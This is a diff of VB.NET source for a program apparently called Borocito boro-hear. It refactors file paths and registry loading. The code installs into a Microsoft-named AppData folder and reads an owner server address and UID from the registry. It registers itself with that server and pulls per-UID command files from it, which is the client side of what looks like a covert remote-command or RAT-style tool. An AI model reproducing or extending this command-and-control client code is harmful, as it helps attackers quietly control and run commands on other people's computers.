@@ -8,7 +8,7 @@ Module Utility
     Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
         Try
             Dim OverWrite As Boolean = False
-            If My.Computer.FileSystem.FileExists(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log") Then
+            If My.Computer.FileSystem.FileExists(DIRHome & "\" & My.Application.Info.AssemblyName & ".log") Then
                 OverWrite = True
             End If
             Dim finalContent As String = Nothing
@@ -19,7 +19,7 @@ Module Utility
             tlmContent = tlmContent & Message & vbCrLf
             Console.WriteLine("[" & from & "]" & finalContent & " " & content)
             Try
-                My.Computer.FileSystem.WriteAllText(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
+                My.Computer.FileSystem.WriteAllText(DIRHome & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
             Catch
             End Try
         Catch ex As Exception
@@ -42,6 +42,7 @@ End Module
 Module GlobalUses
     Public parameters As String
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\boro-hear"
+    Public DIRHome As String = DIRCommons & "\boro-get\" & My.Application.Info.AssemblyName
 
     Public HttpOwnerServer As String
     Public UID As String
@@ -52,7 +53,7 @@ Module StartUp
     Sub Init()
         Try
             CommonActions()
-            CheckInstall()
+            LoadRegedit()
         Catch ex As Exception
             AddToLog("Init@StartUp", "Error: " & ex.Message, True)
         End Try
@@ -62,28 +63,22 @@ Module StartUp
             If Not My.Computer.FileSystem.DirectoryExists(DIRCommons) Then
                 My.Computer.FileSystem.CreateDirectory(DIRCommons)
             End If
+            If Not My.Computer.FileSystem.DirectoryExists(DIRHome) Then
+                My.Computer.FileSystem.CreateDirectory(DIRHome)
+            End If
         Catch ex As Exception
             AddToLog("CommonActions@StartUp", "Error: " & ex.Message, True)
         End Try
     End Sub
-    Sub CheckInstall()
+    Sub LoadRegedit()
         Try
-            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-hear", True)
-            If regKey Is Nothing Then
-                Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito\\boro-hear")
-                regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-hear", True)
-            End If
-
-            regKey.SetValue("boro-hear", Application.ExecutablePath)
-            regKey.SetValue("Name", My.Application.Info.AssemblyName)
-            regKey.SetValue("Version", My.Application.Info.Version.ToString)
-
-            regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
+            AddToLog("LoadRegedit@Memory", "Loading data...", False)
+            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
             HttpOwnerServer = "http://" & regKey.GetValue("OwnerServer")
             UID = regKey.GetValue("UID")
             RegisterInstance()
         Catch ex As Exception
-            AddToLog("CheckInstall@StartUp", "Error: " & ex.Message, True)
+            AddToLog("LoadRegedit@StartUp", "Error: " & ex.Message, True)
             End
         End Try
     End Sub
@@ -131,7 +126,7 @@ Module ResponseAdministrator
                 request.Method = "POST"
                 'Obtener comando actual (evita interferir)
                 Dim remoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
-                Dim localCommandFile As String = DIRCommons & "\actualCommand.str"
+                Dim localCommandFile As String = DIRHome & "\actualCommand.str"
                 If My.Computer.FileSystem.FileExists(localCommandFile) Then
                     My.Computer.FileSystem.DeleteFile(localCommandFile)
                 End If
